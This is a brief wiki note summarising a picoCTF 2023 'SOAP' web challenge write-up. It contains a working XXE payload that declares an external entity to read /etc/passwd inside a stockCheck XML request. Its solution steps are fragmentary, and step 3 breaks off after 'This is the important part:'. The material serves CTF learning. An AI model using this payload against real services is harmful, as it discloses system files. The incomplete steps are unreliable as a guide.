---
title: SOAP — picoCTF 2023 web exploitation writeup
created: 2026-06-24
updated: 2026-06-24
type: query
tags: [ctf, picoctf, picoctf2023, web, soap, source-analysis]
sources: [https://raw.githubusercontent.com/noamgariani11/picoCTF-2023-Writeup/main/Web%20Explotation/SOAP/SOAP.md, https://github.com/noamgariani11/picoCTF-2023-Writeup/tree/main/Web%20Explotation/SOAP]
confidence: medium
---

# SOAP — picoCTF 2023 web exploitation writeup

## 참고 URL
- [GitHub raw writeup](https://raw.githubusercontent.com/noamgariani11/picoCTF-2023-Writeup/main/Web%20Explotation/SOAP/SOAP.md)
- [GitHub directory](https://github.com/noamgariani11/picoCTF-2023-Writeup/tree/main/Web%20Explotation/SOAP)

## 핵심 요약
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Web Portal

## 풀이 메모
1. <?xml version="1.0" encoding="UTF-8"?>
2. <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
3. This is the important part:

## 같이 보면 좋은 페이지
- [[picoctf-2023-web-exploitation-survey]]
- [[picoctf-2023-web-exploitation-family-hub]]
- [[picoctf-2023-topic-map]]
